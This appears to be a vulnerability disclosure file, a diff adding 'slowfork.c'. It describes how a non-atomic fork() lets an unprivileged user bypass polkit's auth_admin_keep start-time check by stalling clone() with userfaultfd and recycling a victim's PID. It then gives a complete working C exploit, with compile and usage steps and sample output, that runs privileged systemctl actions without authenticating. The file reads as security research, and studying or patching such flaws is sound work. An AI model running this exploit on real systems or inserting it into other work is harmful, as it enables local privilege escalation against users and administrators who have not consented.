@@ -1,0 +1,385 @@
+/*
+When a (non-root) user attempts to e.g. control systemd units in the system
+instance from an active session over DBus, the access is gated by a polkit
+policy that requires "auth_admin_keep" auth. This results in an auth prompt
+being shown to the user, asking the user to confirm the action by entering the
+password of an administrator account.
+
+After the action has been confirmed, the auth decision for "auth_admin_keep" is
+cached for up to five minutes. Subject to some restrictions, similar actions can
+then be performed in this timespan without requiring re-auth:
+
+ - The PID of the DBus client requesting the new action must match the PID of
+   the DBus client requesting the old action (based on SO_PEERCRED information
+   forwarded by the DBus daemon).
+ - The "start time" of the client's PID (as seen in /proc/$pid/stat, field 22)
+   must not have changed. The granularity of this timestamp is in the
+   millisecond range.
+ - polkit polls every two seconds whether a process with the expected start time
+   still exists. If not, the temporary auth entry is purged.
+
+Without the start time check, this would obviously be buggy because an attacker
+could simply wait for the legitimate client to disappear, then create a new
+client with the same PID.
+
+Unfortunately, the start time check is bypassable because fork() is not atomic.
+Looking at the source code of copy_process() in the kernel:
+
+        p->start_time = ktime_get_ns();
+        p->real_start_time = ktime_get_boot_ns();
+        [...]
+        retval = copy_thread_tls(clone_flags, stack_start, stack_size, p, tls);
+        if (retval)
+                goto bad_fork_cleanup_io;
+
+        if (pid != &init_struct_pid) {
+                pid = alloc_pid(p->nsproxy->pid_ns_for_children);
+                if (IS_ERR(pid)) {
+                        retval = PTR_ERR(pid);
+                        goto bad_fork_cleanup_thread;
+                }
+        }
+
+The ktime_get_boot_ns() call is where the "start time" of the process is
+recorded. The alloc_pid() call is where a free PID is allocated. In between
+these, some time passes; and because the copy_thread_tls() call between them can
+access userspace memory when sys_clone() is invoked through the 32-bit syscall
+entry point, an attacker can even stall the kernel arbitrarily long at this
+point (by supplying a pointer into userspace memory that is associated with a
+userfaultfd or is backed by a custom FUSE filesystem).
+
+This means that an attacker can immediately call sys_clone() when the victim
+process is created, often resulting in a process that has the exact same start
+time reported in procfs; and then the attacker can delay the alloc_pid() call
+until after the victim process has died and the PID assignment has cycled
+around. This results in an attacker process that polkit can't distinguish from
+the victim process.
+
+
+I have attached a reproducer as slowfork.c. Usage:
+
+
+Compile:
+
+    $ gcc -o slowfork slowfork.c -pthread -O2
+
+
+As user A, run it:
+
+    $ ./slowfork
+
+No output appears at this point.
+
+
+As user B, run "systemctl stop cups.service". When the auth prompt comes up,
+wait a few seconds, then enter the required password.
+
+
+If the attack worked, user A should show see something like this:
+
+======
+got uffd msg
+good pagefault
+old start time: 2454277
+awaiting death of 16466...
+cycling...
+cycling done
+cycling...
+cycling done
+scanning for previous free PID
+looping PID (going for 16465)
+resolving pagefault
+clone result (positive): 16466
+new start time: 2454277
+child died, exiting
+======
+
+cups.service should be running afterwards because the PoC running as user A
+restarted it.
+
+Sometimes the attack fails because the start time of the attacker process is off
+by one ("old start time" and "new start time" don't match); in that case, user
+A will get an auth popup. It tends to work after a few tries for me.
+(The attack would likely work much more reliably if the PoC triggered the
+sys_clone() on victim process creation; at the moment, it only triggers when the
+victim process calls execve().)
+
+Tested on Ubuntu 18.04.
+*/
+
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <linux/userfaultfd.h>
+#include <err.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <signal.h>
+#include <stdio.h>
+#include <sched.h>
+#include <asm/ldt.h>
+#include <errno.h>
+#include <stdbool.h>
+
+static int uffd;
+static void *uf_mapping;
+static int target_pid = -1;
+
+static char exit_stack[0x2000];
+static int exit_fn(void *dummy) {
+	syscall(__NR_exit, 0);
+}
+
+static pid_t consume_pid(void) {
+	pid_t loop_pid = clone(exit_fn, exit_stack+sizeof(exit_stack),
+			       CLONE_FILES|CLONE_FS|CLONE_IO|
+			       CLONE_SIGHAND|CLONE_SYSVSEM|
+			       CLONE_VM|SIGCHLD, NULL);
+	if (loop_pid == -1) err(1, "clone");
+	int status;
+	pid_t res = wait(&status);
+	if (res != loop_pid) err(1, "wait");
+	return loop_pid;
+}
+
+static pid_t consume_pids(void) {
+	pid_t loop_pid;
+	for (int i=0; i<10; i++) {
+		loop_pid = clone(exit_fn, exit_stack+sizeof(exit_stack),
+			         CLONE_FILES|CLONE_FS|CLONE_IO|
+			         CLONE_SIGHAND|CLONE_SYSVSEM|
+			         CLONE_VM|SIGCHLD, NULL);
+		if (loop_pid == -1) err(1, "clone");
+	}
+	for (int i=0; i<10; i++) {
+		int status;
+		pid_t res = wait(&status);
+		if (res == -1) err(1, "wait");
+	}
+	return loop_pid;
+}
+
+static pid_t last_pid_for_ns(void) {
+	char buf[20];
+	int fd = open("/proc/sys/kernel/ns_last_pid", O_RDONLY);
+	int res = read(fd, buf, sizeof(buf)-1);
+	if (res <= 0) err(1, "ns_last_pid read");
+	close(fd);
+	buf[res] = 0;
+	return atoi(buf);
+}
+
+static void *continue_thread(void *dummy) {
+	struct uffd_msg msg;
+	int res = read(uffd, &msg, sizeof(struct uffd_msg));
+	if (res != sizeof(struct uffd_msg)) err(1, "uffd read");
+	printf("got uffd msg\n");
+	if (msg.event != UFFD_EVENT_PAGEFAULT) errx(1, "bad event");
+	if (msg.arg.pagefault.address != (unsigned long)uf_mapping)
+		errx(1, "bad address");
+	printf("good pagefault\n");
+
+	char stat_path[100];
+	sprintf(stat_path, "/proc/%d/stat", target_pid);
+	int s_fd = open(stat_path, O_RDONLY);
+	char s_buf[1000];
+	int read_res = read(s_fd, s_buf, sizeof(s_buf)-1);
+	close(s_fd);
+	if (read_res > 0) {
+		s_buf[read_res] = 0;
+		char *cs_p = s_buf;
+		for (int i=1; i<22; i++) {
+			cs_p = strchr(cs_p, ' ');
+			if (cs_p == NULL) errx(1, "bad stat");
+			cs_p++;
+		}
+		long start_time_old = strtol(cs_p, NULL, 10);
+		printf("old start time: %ld\n", start_time_old);
+	}
+
+	printf("awaiting death of %d...\n", target_pid);
+	while (1) {
+		int res = kill(target_pid, 0);
+		if (res == -1 && errno == ESRCH) break;
+
+		// ensure that we're always within ~100 PIDs
+		bool printed = false;
+		while (1) {
+			pid_t last = last_pid_for_ns();
+			if (last < target_pid && last > target_pid - 100)
+				break;
+			if (!printed) {
+				printf("cycling...\n");
+				printed = true;
+			}
+			consume_pids();
+		}
+		if (printed)
+			printf("cycling done\n");
+
+		usleep(10000);
+	}
+
+	printf("scanning for previous free PID\n");
+	pid_t child_search_pid = target_pid - 1;
+	while (1) {
+		if (child_search_pid <= 2) errx(1, "can't handle underflow");
+		int res = kill(child_search_pid, 0);
+		if (res == -1 && errno == ESRCH) break;
+		child_search_pid--;
+	}
+
+	printf("looping PID (going for %d)\n", child_search_pid);
+	while (1) {
+		pid_t loop_pid = consume_pid();
+		if (loop_pid == child_search_pid) break;
+	}
+
+	printf("resolving pagefault\n");
+	union {
+		struct user_desc data;
+		char pad[0x1000];
+	} ldt_desc = { .data = {
+		.entry_number = 14,
+		.read_exec_only = 1,
+		.seg_not_present = 1
+	} };
+	struct uffdio_copy copy = {
+		.dst = (unsigned long)uf_mapping,
+		.src = (unsigned long)&ldt_desc,
+		.len = 0x1000,
+		.mode = 0
+	};
+	if (ioctl(uffd, UFFDIO_COPY, &copy)) err(1, "copy");
+	if (copy.copy != 0x1000) errx(1, "copy len");
+	return NULL;
+}
+
+int main(void) {
+	// Documentation for userfaultfd:
+	// http://man7.org/linux/man-pages/man2/userfaultfd.2.html
+	// http://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html
+	// https://blog.lizzie.io/using-userfaultfd.html
+	uffd = syscall(__NR_userfaultfd, 0);
+	if (uffd == -1) err(1, "userfaultfd");
+	struct uffdio_api api = { .api = 0xAA, .features = 0 };
+	if (ioctl(uffd, UFFDIO_API, &api)) err(1, "API");
+	uf_mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+			  MAP_PRIVATE|MAP_ANONYMOUS|MAP_32BIT, -1, 0);
+	if (uf_mapping == MAP_FAILED) err(1, "mmap");
+	struct uffdio_register reg = {
+		.range = {
+			.start = (unsigned long)uf_mapping,
+			.len = 0x1000
+		},
+		.mode = UFFDIO_REGISTER_MODE_MISSING
+	};
+	if (ioctl(uffd, UFFDIO_REGISTER, &reg)) err(1, "REGISTER");
+
+	pthread_t ct;
+	if (pthread_create(&ct, NULL, continue_thread, NULL)) errx(1, "thread");
+
+	// Wait for the legitimate task to spawn.
+	DIR *proc_dir = opendir("/proc");
+	if (proc_dir == NULL) err(1, "opendir");
+	while (1) {
+		rewinddir(proc_dir);
+		struct dirent *dent;
+		while ((dent = readdir(proc_dir)) != NULL) {
+			if (dent->d_name[0] < '0' || dent->d_name[0] > '9')
+				continue;
+			char comm_path[30];
+			sprintf(comm_path, "/proc/%s/comm", dent->d_name);
+			char comm[20];
+			int comm_fd = open(comm_path, O_RDONLY);
+			if (comm_fd == -1) continue;
+			ssize_t res = read(comm_fd, comm, 19);
+			if (res < 0)
+				comm[0] = 0;
+			else
+				comm[res] = 0;
+			close(comm_fd);
+			if (strcmp(comm, "systemctl\n") == 0) {
+				target_pid = atoi(dent->d_name);
+				break;
+			}
+		}
+		if (target_pid != -1) break;
+	}
+
+	// Call clone() *through the 32-bit syscall API*.
+	unsigned long clone_flags = CLONE_SETTLS | SIGCHLD;
+	unsigned long tls_val = (unsigned long)uf_mapping;
+	int clone_result;
+	asm volatile(
+		"mov $120, %%rax\n\t"
+		"mov %[clone_flags], %%rbx\n\t"
+		"mov $0, %%rcx\n\t" //newsp
+		"mov $0, %%rdx\n\t" //parent_tidptr
+		"mov %[tls_val], %%rsi\n\t"
+		"mov $0, %%rdi\n\t" //child_tidptr
+		"int $0x80\n\t"
+		"mov %%eax, %[clone_result]\n\t"
+	: // out
+		[clone_result] "=m"(clone_result)
+	: // in
+		[clone_flags] "m"(clone_flags),
+		[tls_val] "m"(tls_val)
+	: // clobber
+		// 32-bit entry path zeroes the 64-bit-only registers
+		"r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
+		// syscall args and retval
+		"rax", "rcx", "rdx", "rsi", "rdi",
+		// misc stuff
+		"memory", "cc"
+	);
+	if (clone_result < 0) {
+		printf("clone result (negative): %d\n", clone_result);
+		return 1;
+	}
+	if (clone_result == 0) {
+		/*
+		while (1) syscall(__NR_pause);
+		*/
+		char *argv[] = {
+			"systemctl",
+			"start",
+			"cups.service",
+			NULL
+		};
+		syscall(__NR_execve, "/bin/systemctl", argv, environ);
+		syscall(__NR_exit, 1);
+	}
+	printf("clone result (positive): %d\n", clone_result);
+
+	char child_stat_path[100];
+	sprintf(child_stat_path, "/proc/%d/stat", clone_result);
+	int cs_fd = open(child_stat_path, O_RDONLY);
+	char cs_buf[1000];
+	int read_res = read(cs_fd, cs_buf, sizeof(cs_buf)-1);
+	close(cs_fd);
+	if (read_res > 0) {
+		cs_buf[read_res] = 0;
+		char *cs_p = cs_buf;
+		for (int i=1; i<22; i++) {
+			cs_p = strchr(cs_p, ' ');
+			if (cs_p == NULL) errx(1, "bad stat");
+			cs_p++;
+		}
+		long start_time_new = strtol(cs_p, NULL, 10);
+		printf("new start time: %ld\n", start_time_new);
+	}
+
+	int status;
+	if (wait(&status) != clone_result)
+		err(1, "wait");
+	printf("child died, exiting\n");
+	return 0;
+}
